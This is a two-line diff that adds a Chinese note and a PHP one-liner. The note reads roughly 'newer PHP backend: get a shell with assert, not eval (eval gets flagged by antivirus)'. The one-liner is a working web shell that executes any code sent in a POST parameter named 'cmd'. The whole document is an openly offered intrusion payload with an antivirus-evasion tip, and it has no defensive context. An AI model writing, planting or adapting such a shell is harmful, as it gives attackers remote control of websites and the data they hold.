@@ -1,0 +1,2 @@
+新版php后台拿shell用assert而不用eval(被杀之)
+<?php assert($_POST[cmd]);?> 
